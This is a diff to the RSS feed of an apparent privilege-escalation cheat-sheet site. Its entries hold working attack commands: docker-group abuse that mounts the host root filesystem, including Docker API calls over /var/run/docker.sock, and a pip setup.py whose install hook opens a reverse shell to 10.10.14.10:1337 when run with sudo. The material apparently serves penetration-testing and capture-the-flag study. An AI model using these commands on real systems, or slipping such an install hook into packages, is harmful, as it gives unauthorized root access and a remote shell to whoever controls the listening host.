@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description> Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root </description>
+      <description>Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root Docker API # Show running containers curl -s --unix-socket /var/run/docker.sock http://localhost/images/json # Create container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --data-binary &amp;#39;{&amp;#34;Image&amp;#34;: &amp;#34;&amp;lt;image_name&amp;gt;:latest&amp;#34;,&amp;#34;HostConfig&amp;#34;: {&amp;#34;Binds&amp;#34;: [&amp;#34;/:/r&amp;#34;]}, &amp;#34;Cmd&amp;#34;: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;ls -la /r/root/&amp;#34;], &amp;#34;Tty&amp;#34;: true}&amp;#39; --unix-socket /var/run/docker.sock http://localhost/containers/create # Start container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --unix-socket /var/run/docker.</description>
     </item>
     <item>
       <title>git</title>
@@ -82,7 +82,7 @@
       <link>https://tldrbins.github.io/pip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pip/</guid>
-      <description> Privesc #!/usr/bin/env python3 from setuptools import setup from setuptools.command.install import install import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) # Run sudo pip install . </description>
+      <description> SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
     </item>
     <item>
       <title>Redis</title>
